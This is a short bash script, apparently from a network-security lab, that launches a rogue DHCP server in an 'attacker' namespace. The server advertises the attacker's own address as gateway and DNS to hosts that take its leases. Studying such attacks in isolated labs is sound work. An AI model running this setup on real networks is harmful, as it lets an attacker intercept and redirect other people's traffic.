#! /bin/bash

sudo ip netns exec attacker \
  python3 source\ codes/attacker/rogue_dhcp_server.py \
  --iface v-attacker \
  --attacker-ip 10.0.0.66 \
  --netmask 255.255.255.0 \
  --gateway 10.0.0.66 \
  --dns 10.0.0.66 \
  --pool-start 10.0.0.200 \
  --pool-end 10.0.0.220 \
  --lease-time 300